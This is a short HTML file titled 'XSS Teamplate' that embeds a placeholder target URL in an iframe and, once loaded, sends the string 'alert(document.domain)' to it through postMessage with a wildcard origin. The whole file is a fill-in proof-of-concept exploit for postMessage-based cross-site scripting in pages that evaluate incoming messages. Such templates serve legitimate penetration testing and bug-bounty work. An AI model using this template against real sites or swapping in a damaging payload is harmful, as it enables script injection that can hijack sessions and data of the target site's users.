<html>
<head>
    <meta charset="utf-8">
    <title>XSS Teamplate</title>
</head>
<body>
<script>
    
    var frame = document.createElement("iframe");
    frame.src = "[put your target url here]";
    frame.onload = function() {
    frame.contentWindow.postMessage("alert(document.domain)" , "*");
    }
    document.body.appendChild(frame);

</script>

</body>
</html>
